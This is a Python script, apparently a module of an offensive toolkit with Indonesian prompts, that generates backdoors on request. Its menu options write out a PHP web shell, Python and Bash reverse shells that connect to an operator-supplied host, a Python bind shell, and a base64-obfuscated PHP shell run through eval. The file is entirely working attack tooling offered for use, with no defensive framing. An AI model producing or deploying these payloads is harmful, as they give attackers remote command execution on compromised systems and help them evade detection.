DESCRIPTION = "Backdoor & Payload Generator"
def run():
    import os, base64
    
    print("[1] PHP Web Shell")
    print("[2] Python Reverse Shell")
    print("[3] Bash Reverse Shell")
    print("[4] Python Bind Shell")
    print("[5] Encoded PHP Shell")
    choice = input("Pilih: ")
    
    if choice == "1":
        shell = '<?php system($_GET["cmd"]); ?>'
        with open("shell.php", "w") as f:
            f.write(shell)
        print("[+] shell.php tersimpan.")
    
    elif choice == "2":
        ip = input("LHOST: ")
        port = input("LPORT: ")
        code = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
        with open("revshell.py", "w") as f:
            f.write(code)
        print("[+] revshell.py tersimpan.")
    
    elif choice == "3":
        ip = input("LHOST: ")
        port = input("LPORT: ")
        code = f'#!/bin/bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1'
        with open("revshell.sh", "w") as f:
            f.write(code)
        os.system("chmod +x revshell.sh")
        print("[+] revshell.sh tersimpan.")
    
    elif choice == "4":
        port = input("LPORT: ")
        code = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",{port}))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
        with open("bindshell.py", "w") as f:
            f.write(code)
        print("[+] bindshell.py tersimpan.")
    
    elif choice == "5":
        shell = '<?php system($_GET["cmd"]); ?>'
        encoded = base64.b64encode(shell.encode()).decode()
        code = f'<?php eval(base64_decode("{encoded}")); ?>'
        with open("encoded_shell.php", "w") as f:
            f.write(code)
        print("[+] encoded_shell.php tersimpan.")
